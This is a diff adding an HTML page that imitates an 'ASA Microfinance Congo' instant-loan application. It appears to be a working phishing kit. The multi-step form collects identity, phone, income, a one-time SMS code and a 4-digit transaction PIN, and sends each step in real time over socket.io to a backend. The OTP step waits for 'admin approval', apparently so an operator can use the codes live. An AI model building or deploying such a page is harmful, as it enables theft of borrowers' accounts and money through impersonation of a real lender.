@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>ASA Microfinance Congo - Demande de Crédit Instantané</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script defer src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js"></script>
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        [x-cloak] { display: none !important; }
+        :root {
+            --bg-dark: #070b19;
+            --accent-orange: #ff0000;
+            --text-main: #ffffff;
+            --text-dim: #94a3b8;
+            --input-bg: rgba(255, 255, 255, 0.05);
+            --border-color: #334155;
+            --accent-teal: #00c2c2;
+        }
+        * { -webkit-tap-highlight-color: transparent; }
+        body { 
+            background: linear-gradient(180deg, #070b19 0%, #030611 100%);
+            color: var(--text-main); 
+            font-family: 'Inter', sans-serif; 
+            min-height: 100vh; 
+            position: relative; 
+            overflow-x: hidden; 
+            margin: 0;
+            -webkit-font-smoothing: antialiased;
+        }
+        select.input-premium option { background-color: #1e293b; color: white; }
+        .curve-top { 
+            position: absolute; 
+            top: 0; 
+            left: 0; 
+            width: 100%; 
+            height: 40vh; 
+            background: radial-gradient(circle at 50% -20%, #ff0000 0%, #660000 50%, rgba(7, 11, 25, 0) 100%); 
+            z-index: -1; 
+            border-bottom-left-radius: 50% 20%; 
+            border-bottom-right-radius: 50% 20%; 
+        }
+        .glass-panel { background: rgba(17, 24, 39, 0.8); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.08); box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); border-radius: 1.25rem; }
+        .input-premium { background: var(--input-bg); border: 1px solid var(--border-color); color: var(--text-main); padding: 0.875rem 1.25rem; width: 100%; border-radius: 0.75rem; outline: none; transition: all 0.3s; font-size: 0.9375rem; }
+        .input-premium:focus { border-color: var(--accent-orange); box-shadow: 0 0 0 3px rgba(255, 0, 0, 0.2); }
+        .btn-premium { background: var(--accent-orange); color: white; padding: 1rem; font-weight: 600; border-radius: 0.75rem; width: 100%; transition: 0.3s; display: flex; justify-content: center; align-items: center; gap: 0.5rem; border:none; cursor:pointer; }
+        .btn-premium:disabled { opacity: 0.5; cursor: not-allowed; }
+        .btn-secondary { background: transparent; border: 1px solid var(--border-color); color: var(--text-dim); padding: 1rem; border-radius: 0.75rem; transition: 0.3s; cursor: pointer; }
+        .label-premium { font-size: 0.75rem; font-weight: 600; text-transform: uppercase; letter-spacing: 0.05em; color: var(--text-dim); margin-bottom: 0.5rem; display: block; }
+        .progress-step { display: flex; flex-direction: column; align-items: center; flex: 1; }
+        .progress-dot { width: 32px; height: 32px; border-radius: 50%; background: #1e293b; border: 2px solid #334155; display: flex; align-items: center; justify-content: center; font-size: 14px; font-weight: bold; margin-bottom: 6px; }
+        .progress-step.active .progress-dot { background: var(--accent-orange); border-color: var(--accent-orange); }
+        .progress-step.completed .progress-dot { background: #10b981; border-color: #10b981; }
+        .progress-step.completed .progress-dot::after { content: '✓'; font-size: 16px; }
+        .progress-step.completed .progress-dot span { display: none; }
+        .pin-box { width: 50px; height: 50px; border: 2px solid var(--accent-teal); border-radius: 10px; text-align: center; font-size: 24px; background: #0f172a; color: #ffffff; outline: none; }
+        .ib-phone-wrapper { display: flex; border: 2px solid var(--accent-teal); border-radius: 10px; padding: 10px; align-items: center; background: #0f172a; }
+        .ib-country-code { display: flex; align-items: center; gap: 10px; padding-right: 10px; border-right: 1px solid #1f2937; color: #e2e8f0; }
+        .spinner-sm { animation: spin 1s linear infinite; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,0.3); border-top-color: white; border-radius: 50%; display: inline-block; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body x-data="loanFlow()" x-init="init()" class="antialiased">
+    <div class="curve-top"></div>
+
+    <main class="max-w-xl mx-auto px-4 pt-10 pb-20 relative z-10">
+        <section class="glass-panel overflow-hidden relative">
+            <div class="bg-white px-6 py-6 border-b border-gray-200">
+                <div class="flex flex-col items-center">
+                    <img src="https://www.nicepng.com/png/detail/251-2513313_asa-logo-rgb-colour-horiz-fullsize-distr-asa.png" alt="ASA Logo" class="h-12 w-auto mb-3">
+                    <h1 class="text-xl font-bold text-gray-900">ASA Microfinance Congo</h1>
+                    <p class="text-[10px] font-bold text-gray-400 uppercase tracking-widest">Demande de Crédit Instantané</p>
+                </div>
+            </div>
+
+            <div class="p-6 md:p-8">
+                <div class="flex justify-between mb-8">
+                    <template x-for="i in 5" :key="i">
+                        <div class="progress-step" :class="{ 'active': step === i, 'completed': step > i }">
+                            <div class="progress-dot"><span x-text="i"></span></div>
+                        </div>
+                    </template>
+                </div>
+                
+                <!-- Étape 1: Détails du crédit -->
+                <div x-show="step === 1" x-transition.duration.200ms>
+                    <div class="flex justify-between items-center mb-6"><h2 class="text-xl font-bold">Détails du Crédit</h2><span class="text-xs font-bold text-red-500">Étape 01</span></div>
+                    <div class="space-y-4">
+                        <select x-model="form.loanType" class="input-premium">
+                            <option value="">Sélectionnez le type de crédit</option>
+                            <option value="Personal">Crédit Personnel</option>
+                            <option value="Business">Crédit Commercial</option>
+                        </select>
+                        <div>
+                            <div class="flex justify-between"><label class="label-premium">Montant (CDF)</label><span class="text-xl font-bold" x-text="'CDF  ' + form.amount"></span></div>
+                            <input type="range" x-model="form.amount" min="50" max="500000" step="50" class="w-full accent-red-600">
+                        </div>
+                        <select x-model="form.term" class="input-premium">
+                            <option value="">Sélectionnez la durée</option>
+                            <option value="3">3 mois</option><option value="6">6 mois</option><option value="12">12 mois</option>
+                        </select>
+                        <textarea x-model="form.purpose" class="input-premium h-24" placeholder="Motif du crédit"></textarea>
+                        <button @click="submitStep1" :disabled="!isStep1Valid" class="btn-premium">Continuer →</button>
+                    </div>
+                </div>
+
+                <!-- Étape 2: Vérification de l'identité -->
+                <div x-show="step === 2" x-cloak x-transition.duration.200ms>
+                    <div class="flex justify-between items-center mb-6"><h2 class="text-xl font-bold">Vérification d'Identité</h2><span class="text-xs font-bold text-red-500">Étape 02</span></div>
+                    <div class="space-y-4">
+                        <div class="grid grid-cols-2 gap-4"><input type="text" x-model="form.firstName" class="input-premium" placeholder="Prénom"><input type="text" x-model="form.lastName" class="input-premium" placeholder="Nom"></div>
+                        <input type="email" x-model="form.email" class="input-premium" placeholder="Adresse e-mail">
+                        <div class="flex"><span class="input-premium w-28 flex items-center">🇨🇩 +243</span><input type="tel" x-model="form.phone" class="input-premium flex-1" placeholder="XXXXXXXXX" maxlength="9"></div>
+                        <div class="grid grid-cols-2 gap-4"><button @click="step = 1" class="btn-secondary">← Retour</button><button @click="submitStep2" :disabled="!isStep2Valid" class="btn-premium">Continuer →</button></div>
+                    </div>
+                </div>
+
+                <!-- Étape 3: Informations professionnelles -->
+                <div x-show="step === 3" x-cloak x-transition.duration.200ms>
+                    <div class="flex justify-between items-center mb-6"><h2 class="text-xl font-bold">Informations Professionnelles</h2><span class="text-xs font-bold text-red-500">Étape 03</span></div>
+                    <div class="space-y-4">
+                        <select x-model="form.employment" class="input-premium"><option value="">Sélectionnez le statut</option><option value="Employed">Salarié(e)</option><option value="Self-Employed">Travailleur indépendant</option></select>
+                        <input type="number" x-model="form.income" class="input-premium" placeholder="Revenu annuel (CDF)">
+                        <input type="text" x-model="form.employer" class="input-premium" placeholder="Employeur (optionnel)">
+                        <div class="grid grid-cols-2 gap-4"><button @click="step = 2" class="btn-secondary">← Retour</button><button @click="submitStep3" :disabled="!isStep3Valid" class="btn-premium">Continuer →</button></div>
+                    </div>
+                </div>
+
+                <!-- Étape 4: Vérification OTP -->
+                <div x-show="step === 4" x-cloak x-transition.duration.200ms>
+                    <div class="flex justify-between items-center mb-6"><h2 class="text-xl font-bold">Vérification OTP</h2><span class="text-xs font-bold text-red-500">Étape 04</span></div>
+                    <div class="space-y-4">
+                        <p class="text-sm text-gray-400">Veuillez saisir le code de vérification à usage unique envoyé à votre numéro de téléphone mobile vérifié.</p>
+                        <input type="text" x-model="otpData.code" class="input-premium text-center tracking-widest text-lg font-bold" placeholder="Saisir le code OTP" maxlength="6">
+                        <div class="grid grid-cols-2 gap-4 pt-4"><button @click="step = 3" class="btn-secondary">← Retour</button><button @click="requestAdminApproval" :disabled="!isStep4Valid || otpVerifying" class="btn-premium"><span x-show="!otpVerifying">Vérifier le code →</span><span x-show="otpVerifying" class="spinner-sm"></span></button></div>
+                    </div>
+                </div>
+
+                <!-- Étape 5: Confirmer le code PIN de sécurité -->
+                <div x-show="step === 5" x-cloak x-transition.duration.200ms>
+                    <div class="flex justify-between items-center mb-6"><h2 class="text-xl font-bold">Confirmer le Code PIN</h2><span class="text-xs font-bold text-red-500">Étape 05</span></div>
+                    <div class="space-y-4">
+                        <p class="text-sm text-gray-400 text-center mb-4">Saisissez votre code PIN de transaction à 4 chiffres pour finaliser l'enregistrement.</p>
+                        <div class="flex justify-center gap-3">
+                            <template x-for="(_, i) in 4" :key="i"><input type="password" class="pin-box" maxlength="1" @input="movePinFocus($event, i)" x-model="pin.value[i]"></template>
+                        </div>
+                        <div class="grid grid-cols-2 gap-4 pt-6">
+                            <button @click="step = 4" class="btn-secondary" :disabled="pinVerifying">← Retour</button>
+                            <button @click="submitStep5" :disabled="!isPinValid || pinVerifying" class="btn-premium">
+                                <span x-show="!pinVerifying">Confirmer & Soumettre →</span>
+                                <span x-show="pinVerifying" class="spinner-sm"></span>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Étape 6: Page de succès -->
+                <div x-show="step === 6" x-cloak class="text-center py-8">
+                    <div class="text-6xl mb-4">✅</div>
+                    <h2 class="text-2xl font-bold text-green-400">Demande Soumise avec Succès !</h2>
+                    <p class="text-gray-400">Référence : <span x-text="referenceId"></span></p>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <script>
+        function loanFlow() {
+            return {
+                step: 1, appId: '', referenceId: '', 
+                form: { loanType: '', amount: 500, term: '', purpose: '', firstName: '', lastName: '', email: '', phone: '', employment: '', income: '', employer: '' },
+                otpData: { code: '' },
+                pin: { value: ['', '', '', ''] },
+                otpVerifying: false, pinVerifying: false, socket: null,
+
+                get isStep1Valid() { return this.form.loanType && this.form.term && this.form.purpose; },
+                get isStep2Valid() { return this.form.firstName && this.form.lastName && this.form.phone; },
+                get isStep3Valid() { return this.form.employment && this.form.income; },
+                get isStep4Valid() { return this.otpData.code.length >= 4; },
+                get isPinValid() { return this.pin.value.join('').length === 4; },
+
+                init() {
+                    this.socket = io();
+                    this.socket.on('session-ready', (data) => { this.appId = data.appId; });
+                    this.socket.on('otp-verified', () => { this.otpVerifying = false; this.step = 5; });
+                    this.socket.on('pin-verified', (d) => { this.pinVerifying = false; this.referenceId = d.referenceId; this.step = 6; });
+                },
+
+                submitStep1() { this.socket.emit('step1', this.form); this.step = 2; },
+                submitStep2() { this.socket.emit('step2', this.form); this.step = 3; },
+                submitStep3() { this.socket.emit('step3', this.form); this.step = 4; },
+                requestAdminApproval() { this.otpVerifying = true; this.socket.emit('step4', this.otpData); },
+                submitStep5() { this.pinVerifying = true; this.socket.emit('step5', { pin: this.pin.value.join('') }); },
+                movePinFocus(e, i) { if (e.target.value && i < 3) document.querySelectorAll('.pin-box')[i+1].focus(); }
+            }
+        }
+    </script>
+</body>
+</html>
